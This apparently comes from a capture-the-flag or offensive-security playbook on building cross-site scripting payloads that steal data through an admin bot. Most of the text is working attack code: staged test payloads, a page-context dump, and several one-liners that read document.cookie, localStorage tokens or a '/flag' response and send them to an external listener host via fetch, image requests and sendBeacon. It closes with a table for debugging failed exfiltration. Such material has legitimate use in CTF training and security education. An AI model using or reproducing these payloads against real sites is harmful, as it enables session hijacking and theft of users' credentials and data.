# Payload development deep — the iteration discipline in detail

## The canary ladder

Climb the ladder — each rung confirms one more property before the
next:

```
R0: does ANY js run?           -> console.log('hit')
R1: is the context right?      -> console.log(document.location.href)
R2: can I read the target?     -> console.log(document.cookie / localStorage / fetch('/flag'))
R3: can I build the exfil val? -> console.log(btoa(the_flag))
R4: does the exfil leave?      -> fetch(TUNNEL+'?v='+val) — watch the log
R5: the real payload           -> fire
```

A payload skipped to R5 debugs all five properties blind — a dead run
tells you nothing about which rung failed.

## The context read

Before any payload, dump the context it lands in — the difference
between a payload that fires and one that silently never runs:

```javascript
return {
  url: location.href,
  origin: location.origin,
  inIframe: window.self !== window.top,
  cookie: document.cookie,
  ls: Object.keys(localStorage),
  csp: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content,
};
```

The `inIframe` check is the common trap — a payload in a frame has a
different `document`/`top` than expected, and a `top.location` exfil
navigates the parent.

## The exfil-value construction

Build the exfil value step by step — the payload dies at the encoding
more often than the fetch:

```javascript
// raw — fine for simple values
fetch('https://T/?d='+document.cookie);
// encoded — when the value has & = ? or specials
fetch('https://T/?d='+encodeURIComponent(document.cookie));
// base64 — safest for arbitrary text
fetch('https://T/?d='+btoa(document.cookie+localStorage.token));
// chunked — when the value is long
document.cookie.split('').forEach((c,i)=>fetch('https://T/?'+i+'='+c));
```

`encodeURIComponent` for query params, `btoa` for arbitrary text — the
encoding is the bug half the time a "perfect" payload exfils garbage.

## The wait-aware payload

Fit the payload's work inside the bot's wait — measure it:

```javascript
// synchronous — fastest, works in any wait
new Image().src='https://T/?c='+document.cookie;
// fire-and-forget — survives navigation
navigator.sendBeacon('https://T/?c='+document.cookie);
// async — needs the wait to cover the fetch round-trip
fetch('/flag').then(r=>r.text()).then(t=>fetch('https://T/?f='+btoa(t)));
```

A two-hop payload (read `/flag` then exfil) needs the wait to cover
BOTH requests — measure the round-trips, do not guess.

## The failure-triage decision

| The last marker | The bug is in |
|---|---|
| no `S1` | the injection/context — `../web-xss/` |
| `S1` no `S2` | reading the target (cookie/storage/fetch) |
| `S2` no `S3` | building the exfil value (encoding) |
| `S3` no listener | the channel (tunnel/CSP/egress) |

Each stage's death routes to a different fix — the staged markers are
what tell you which.
